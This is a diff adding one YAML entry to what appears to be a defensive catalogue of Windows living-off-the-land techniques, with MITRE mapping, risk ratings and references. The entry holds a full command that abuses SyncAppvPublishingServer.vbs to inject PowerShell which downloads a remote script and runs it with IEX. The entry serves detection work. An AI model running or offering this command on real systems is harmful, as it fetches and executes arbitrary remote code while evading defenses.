@@ -1,0 +1,21 @@
+- command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
+  description: Abuse SyncAppvPublishingServer.vbs to launch an arbitrary remotely-hosted PowerShell script.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1216
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/
+    - https://twitter.com/monoxgas/status/895045566090010624
+    - https://twitter.com/subTee/status/855738126882316288
+  risk: High
+  risk_reason: Manual usage of this binary is suspicious, especially with remote payloads.
+  fidelity: High
+  fidelity_reason: This is typically a rare operation in most organizations.
+  tool: Syncappvpublishingserver_vbs
+  threatactors:
+    N/A:
+      - N/A
